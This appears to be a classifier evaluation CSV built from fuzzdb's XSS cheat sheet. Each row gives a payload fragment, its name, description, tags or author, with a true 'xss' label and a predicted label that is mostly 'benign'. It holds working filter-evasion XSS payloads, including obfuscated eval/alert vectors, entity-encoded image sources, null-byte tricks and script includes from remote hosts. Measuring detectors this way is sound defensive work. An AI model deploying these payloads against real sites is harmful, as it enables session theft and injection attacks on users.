id,payload,actual,predicted
fuzzdb_1430,Exploit Name: Non-Alpha/Non-Digit Part 2,xss,benign
fuzzdb_1431,"Exploit String: <BODY onload!#$%&()*~+-_.###:;?@[/|\]^`=alert(""XSS"")>",xss,sql_injection
fuzzdb_1432,"Exploit Description: Non-alpha-non-digit XSS part 2.  yawnmoth brought my attention to this vector, based on the same idea as above, however, I expanded on it, using my fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this does not apply to the grave accent char as seen here.",xss,benign
fuzzdb_1433,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1434,Author Name: ha.ckers.org,xss,benign
fuzzdb_1435,Noscript-breaker with mouseover,xss,benign
fuzzdb_1436,Exploit Name: Noscript-breaker with mouseover,xss,benign
fuzzdb_1438,Exploit Description: This vector breaks noscript areas and appends an element reacting on mouseover events.,xss,benign
fuzzdb_1439,"Exploit Tags: general, html breaking, obfuscated, user interaction",xss,benign
fuzzdb_1440,Author Name: kishor,xss,benign
fuzzdb_1441,Null Chars 1,xss,benign
fuzzdb_1442,Exploit Name: Null Chars 1,xss,benign
fuzzdb_1444,"Exploit Description: Okay, I lied, null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy (http://www.portswigger.net/proxy/) or use %00 in the URL string or if you want to write your own injection tool you can use Vim (^V^@ will produce a null) to generate it into a text file.  Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hyphen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example.",xss,benign
fuzzdb_1445,"Exploit Tags: general, evil tags, obfuscated, internet explorer, CRLF",xss,benign
fuzzdb_1446,Author Name: ha.ckers.org,xss,benign
fuzzdb_1447,Null Chars 2,xss,benign
fuzzdb_1448,Exploit Name: Null Chars 2,xss,benign
fuzzdb_1449,"Exploit String: perl -e 'print ""&<SCR\0IPT>alert(""XSS"")</SCR\0IPT>"";' > out",xss,benign
fuzzdb_1450,Exploit Description: Here is a little known XSS attack vector using null characters.  You can actually break up the HTML itself using the same nulls as shown above. I've seen this vector bypass some of the most restrictive XSS filters to date,xss,benign
fuzzdb_1451,"Exploit Tags: general, evil tags, obfuscated, CRLF",xss,benign
fuzzdb_1452,Author Name: ha.ckers.org,xss,benign
fuzzdb_1453,Obfuscated body onload vector,xss,benign
fuzzdb_1454,Exploit Name: Obfuscated body onload vector,xss,benign
fuzzdb_1456,Exploit Description: This vector creates a new body tag and utilizes semicolons and underscores to evade filters and produce an alert.,xss,benign
fuzzdb_1457,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1458,Author Name: thespanner.co.uk,xss,benign
fuzzdb_1459,Obfuscated DOM element creation,xss,benign
fuzzdb_1460,Exploit Name: Obfuscated DOM element creation,xss,benign
fuzzdb_1461,Exploit String: s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=,xss,benign
fuzzdb_1462,0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=,xss,benign
fuzzdb_1463,0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=pa,xss,benign
fuzzdb_1464,rentNode;x.appendChild(i);,xss,benign
fuzzdb_1465,Exploit Description: This vector utilizes ternary operators to obfuscate JavaScript code which creates new DOM elements.,xss,benign
fuzzdb_1466,"Exploit Tags: general, obfuscated, injection",xss,benign
fuzzdb_1467,Author Name: thespanner.co.uk,xss,benign
fuzzdb_1468,Obfuscated double-body onload vector,xss,benign
fuzzdb_1469,Exploit Name: Obfuscated double-body onload vector,xss,benign
fuzzdb_1471,Exploit Description: This vector creates a doubled new body tag and utilizes semicolons to evade filters and produce an alert.,xss,benign
fuzzdb_1472,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1473,Author Name: thespanner.co.uk,xss,benign
fuzzdb_1474,Obfuscated image tag using dec entities,xss,benign
fuzzdb_1475,Exploit Name: Obfuscated image tag using dec entities,xss,benign
fuzzdb_1476,Exploit String: <IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;,xss,sql_injection
fuzzdb_1477,&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>,xss,sql_injection
fuzzdb_1478,Exploit Description: This attack is built together with obfuscated decimal entities and create a JS image source.,xss,benign
fuzzdb_1479,"Exploit Tags: general, basic, obfuscated, evil tags, internet explorer",xss,benign
fuzzdb_1480,Author Name: OWASP,xss,benign
fuzzdb_1481,Obfuscated image tag using hex entities,xss,benign
fuzzdb_1482,Exploit Name: Obfuscated image tag using hex entities,xss,benign
fuzzdb_1483,Exploit String: <IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28,xss,sql_injection
fuzzdb_1484,&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>,xss,sql_injection
fuzzdb_1485,Exploit Description: This attack is built together with obfuscated hexadecimal entities and create a JS image source.,xss,benign
fuzzdb_1486,"Exploit Tags: general, basic, obfuscated, evil tags, internet explorer",xss,benign
fuzzdb_1487,Author Name: OWASP,xss,benign
fuzzdb_1488,Obfuscated image tag using long dec entities,xss,benign
fuzzdb_1489,Exploit Name: Obfuscated image tag using long dec entities,xss,benign
fuzzdb_1490,Exploit String: <IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058,xss,sql_injection
fuzzdb_1491,&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>,xss,sql_injection
fuzzdb_1492,Exploit Description: This attack is built together with obfuscated long decimal entities and create a JS image source.,xss,benign
fuzzdb_1493,"Exploit Tags: general, owasp, obfuscated, evil tags, internet explorer",xss,benign
fuzzdb_1494,Author Name: OWASP,xss,benign
fuzzdb_1495,Obfuscated JS image source,xss,benign
fuzzdb_1496,Exploit Name: Obfuscated JS image source,xss,benign
fuzzdb_1497,"Exploit String: >""'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;",xss,benign
fuzzdb_1498,alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>,xss,benign
fuzzdb_1500,"Exploit Tags: general, owasp, obfuscated, evil tags, internet explorer",xss,benign
fuzzdb_1501,Author Name: OWASP,xss,benign
fuzzdb_1502,Obfuscated name trigger for Firefox,xss,benign
fuzzdb_1503,Exploit Name: Obfuscated name trigger for Firefox,xss,benign
fuzzdb_1504,"Exploit String: (1?(1?{a:1?""""[1?""ev\a\l"":0](1?""\a\lert"":0):0}:0).a:0)[1?""\c\a\l\l"":0](content,1?""x\s\s"":0)",xss,benign
fuzzdb_1505,Exploit Description: This XSS vector uses a parser bug in Firefox to obfuscate the methods needed to trigger the name contained payload.,xss,benign
fuzzdb_1506,"Exploit Tags: general, gecko, obfuscated, self contained",xss,benign
fuzzdb_1507,Author Name: SIrDarckCat,xss,benign
fuzzdb_1508,Obfuscated onload attribute variant 1,xss,benign
fuzzdb_1509,Exploit Name: Obfuscated onload attribute variant 1,xss,benign
fuzzdb_1511,Exploit Description: This vector creates a new body tag including an obfuscated onload attribute. Also the document object is wrapped into a JSON literal to evade filters.,xss,benign
fuzzdb_1512,"Exploit Tags: general, obfuscated, evil tags, JSON",xss,benign
fuzzdb_1513,Author Name: thespanner.co.uk,xss,benign
fuzzdb_1514,Obfuscated onload attribute variant 2,xss,benign
fuzzdb_1515,Exploit Name: Obfuscated onload attribute variant 2,xss,benign
fuzzdb_1517,Exploit Description: This vector creates a new body tag including an obfuscated onload attribute. Also the document object is wrapped into a JSON literal to evade filters.,xss,benign
fuzzdb_1518,"Exploit Tags: general, obfuscated, evil tags, JSON",xss,benign
fuzzdb_1519,Author Name: thespanner.co.uk,xss,benign
fuzzdb_1520,Obfuscated XML predicate vector variation 1,xss,benign
fuzzdb_1521,Exploit Name: Obfuscated XML predicate vector variation 1,xss,benign
fuzzdb_1522,Exploit String: 123[''+<_>ev</_>+<_>al</_>](''+<_>aler</_>+<_>t</_>+<_>(1)</_>);,xss,benign
fuzzdb_1523,Exploit Description: This vector uses XML predicates to obfuscate its payload and the fact that you can use underscores as XML tags.,xss,benign
fuzzdb_1524,"Exploit Tags: general, xml predicates, obfuscated, gecko",xss,benign
fuzzdb_1525,Author Name: PHPIDS Group,xss,benign
fuzzdb_1526,Obfuscated XML predicate vector variation 2,xss,benign
fuzzdb_1527,Exploit Name: Obfuscated XML predicate vector variation 2,xss,benign
fuzzdb_1528,"Exploit String: s1=<s>evalalerta(1)a</s>,s2=<s></s>+'',s3=s1+s2,e1=/s/!=/s/?s3[0]:",xss,benign
fuzzdb_1529,"0,e2=/s/!=/s/?s3[1]:0,e3=/s/!=/s/?s3[2]:0,e4=/s/!=/s/?s3[3]:0,e=/s/!=/",xss,benign
fuzzdb_1530,"s/?0[e1+e2+e3+e4]:0,a1=/s/!=/s/?s3[4]:0,a2=/s/!=/s/?s3[5]:0,a3=/s/!=/",xss,benign
fuzzdb_1531,"s/?s3[6]:0,a4=/s/!=/s/?s3[7]:0,a5=/s/!=/s/?s3[8]:0,a6=/s/!=/s/?s3[10]:",xss,benign
fuzzdb_1532,"0,a7=/s/!=/s/?s3[11]:0,a8=/s/!=/s/?s3[12]:",xss,benign
fuzzdb_1533,"0,a=a1+a2+a3+a4+a5+a6+a7+a8,1,e(a)",xss,benign
fuzzdb_1534,Exploit Description: This vector uses XML predicates to obfuscate its payload and the fact that you can use underscores as XML tags. Also a concatenation via ternary operator is being used.,xss,benign
fuzzdb_1535,"Exploit Tags: general, xml predicates, obfuscated, gecko",xss,benign
fuzzdb_1536,Author Name: PHPIDS Group,xss,benign
fuzzdb_1537,Obfuscated XML predicate vector variation 3,xss,benign
fuzzdb_1538,Exploit Name: Obfuscated XML predicate vector variation 3,xss,benign
fuzzdb_1539,"Exploit String: o={x:''+<s>eva</s>+<s>l</s>,y:''+<s>aler</s>+<s>t</s>+<s>(1)</",xss,benign
fuzzdb_1540,s>};function f() { 0[this.x](this.y) }f.call(o);,xss,benign
fuzzdb_1541,Exploit Description: This vector uses XML predicates to obfuscate its payload. The payload is furthermore wrapped into JSON literals for more obfuscation.,xss,benign
fuzzdb_1542,"Exploit Tags: general, xml predicates, obfuscated, gecko, JSON",xss,benign
fuzzdb_1543,Author Name: .mario,xss,benign
fuzzdb_1544,Obfuscated XSS variant 1,xss,benign
fuzzdb_1545,Exploit Name: Obfuscated XSS variant 1,xss,benign
fuzzdb_1546,"Exploit String: ___=1?'ert(123)':0,_=1?'al':0,__=1?'ev':0,1[__+_](_+___)",xss,benign
fuzzdb_1547,Exploit Description: Shuffled and obfuscated function calls,xss,benign
fuzzdb_1548,"Exploit Tags: general, obfuscated",xss,benign
fuzzdb_1549,Author Name: PHPIDS Group,xss,benign
fuzzdb_1550,OBJECT,xss,benign
fuzzdb_1551,Exploit Name: OBJECT,xss,benign
fuzzdb_1553,"Exploit Description: If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag. The linked file is actually an HTML file that can contain your XSS",xss,benign
fuzzdb_1554,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_1555,Author Name: ha.ckers.org,xss,benign
fuzzdb_1556,OBJECT w/Embedded XSS,xss,benign
fuzzdb_1557,Exploit Name: OBJECT w/Embedded XSS,xss,benign
fuzzdb_1559,Exploit Description: Using an OBJECT tag you can embed XSS directly (this is unverified).,xss,benign
fuzzdb_1560,"Exploit Tags: general, evil tags, obfuscated, internet explorer",xss,benign
fuzzdb_1561,Author Name: ha.ckers.org,xss,benign
fuzzdb_1562,OBJECT w/Flash 2,xss,benign
fuzzdb_1563,Exploit Name: OBJECT w/Flash 2,xss,benign
fuzzdb_1564,"Exploit String: a=""get"";&#10;b=""URL("""";&#10;c=""javascript:"";&#10;d=""alert('XSS');"")"";eval(a+b+c+d);",xss,sql_injection
fuzzdb_1565,Exploit Description: Using this action script inside flash can obfuscate your XSS vector.,xss,benign
fuzzdb_1566,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1567,Author Name: ha.ckers.org,xss,benign
fuzzdb_1568,Octal Encoding,xss,benign
fuzzdb_1569,Exploit Name: Octal Encoding,xss,benign
fuzzdb_1570,"Exploit String: <A HREF=""http://0102.0146.0007.00000223/"">XSS</A>",xss,benign
fuzzdb_1571,Exploit Description: URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).,xss,benign
fuzzdb_1572,"Padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...",xss,benign
fuzzdb_1573,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1574,Author Name: ha.ckers.org,xss,benign
fuzzdb_1575,Open string contained in name property,xss,benign
fuzzdb_1576,Exploit Name: Open string contained in name property,xss,benign
fuzzdb_1577,Exploit String: open(name),xss,benign
fuzzdb_1578,Exploit Description: This very simple but effective vector uses the open method on the name property.,xss,benign
fuzzdb_1579,"Exploit Tags: general, super short, self contained",xss,benign
fuzzdb_1580,Author Name: SIrDarckCat,xss,benign
fuzzdb_1581,PHP,xss,benign
fuzzdb_1582,Exploit Name: PHP,xss,benign
fuzzdb_1583,"Exploit String: <? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",xss,benign
fuzzdb_1584,"Exploit Description: PHP - requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues.",xss,benign
fuzzdb_1585,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1586,Author Name: ha.ckers.org,xss,benign
fuzzdb_1587,Plain JavaScript alert,xss,benign
fuzzdb_1588,Exploit Name: Plain JavaScript alert,xss,benign
fuzzdb_1589,Exploit String: alert(1),xss,benign
fuzzdb_1590,Exploit Description: This very basic exploit works on surprisingly many pages - no real danger but bad image.,xss,benign
fuzzdb_1591,"Exploit Tags: general, basic, super short",xss,benign
fuzzdb_1592,Author Name: .mario,xss,benign
fuzzdb_1593,Protocol Resolution Bypass,xss,benign
fuzzdb_1594,Exploit Name: Protocol Resolution Bypass,xss,benign
fuzzdb_1595,"Exploit String: <A HREF=""//www.google.com/"">XSS</A>",xss,benign
fuzzdb_1596,Exploit Description: URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).,xss,benign
fuzzdb_1597,"Protocol resolution bypass (// translates to http:// which saves a few more bytes). This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like ”(ht|f)tp(s)?://” (thanks to Ozh (http://planetOzh.com/) for part of this one). You can also change the ”//” to ”\\”. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.",xss,benign
fuzzdb_1598,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1599,Author Name: ha.ckers.org,xss,benign
fuzzdb_1600,Protocol resolution in script tags,xss,benign
fuzzdb_1601,Exploit Name: Protocol resolution in script tags,xss,benign
fuzzdb_1602,Exploit String: <SCRIPT SRC=//ha.ckers.org/.j>,xss,benign
fuzzdb_1603,"Exploit Description: This particular variant was submitted by Lukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a </SCRIPT> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The ”.j” is valid, regardless of the MIME type because the browser knows it in context of a SCRIPT tag.",xss,benign
fuzzdb_1604,"Exploit Tags: general, evil tags, obfuscated, injection",xss,benign
fuzzdb_1605,Author Name: ha.ckers.org,xss,benign
fuzzdb_1606,"RegExp based, and native C filter vector.",xss,benign
fuzzdb_1607,"Exploit Name: RegExp based, and native C filter vector.",xss,benign
fuzzdb_1608,Exploit String: 0%0d%0a%00<script src=//h4k.in>,xss,benign
fuzzdb_1609,"Exploit Description: This will break any RegExp that includes ""$"" (end of string), and some filters that do the verification manually with a for waiting for a NULL byte.",xss,benign
fuzzdb_1610,"Exploit Tags: general, injection, CRLF, obfuscated",xss,benign
fuzzdb_1611,Author Name: SIrDarckCat,xss,benign
fuzzdb_1612,Author URL: http://sirdarckcat.net/,xss,benign
fuzzdb_1613,Remote IE URL overloading,xss,benign
fuzzdb_1614,Exploit Name: Remote IE URL overloading,xss,benign
fuzzdb_1615,Exploit String: s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1),xss,benign
fuzzdb_1616,'+'';,xss,benign
fuzzdb_1617,u1=s1+s2+s3;URL=u1,xss,benign
fuzzdb_1618,Exploit Description: This vector assembles an alert which will be fired using the URL property.,xss,benign
fuzzdb_1619,"Exploit Tags: general, obfuscated, internet explorer, URL breaking",xss,benign
fuzzdb_1620,Author Name: thespanner.co.uk,xss,benign
fuzzdb_1621,Remote Stylesheet 1,xss,benign
fuzzdb_1622,Exploit Name: Remote Stylesheet 1,xss,benign
fuzzdb_1623,"Exploit String: <LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",xss,benign
fuzzdb_1624,"Exploit Description: Remote style sheet (using something as simple as a remote style sheet you can include your XSS as the style question redefined using an embedded expression.) This only works in IE and Netscape 8.1+ in IE rendering engine mode.  Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page.",xss,benign
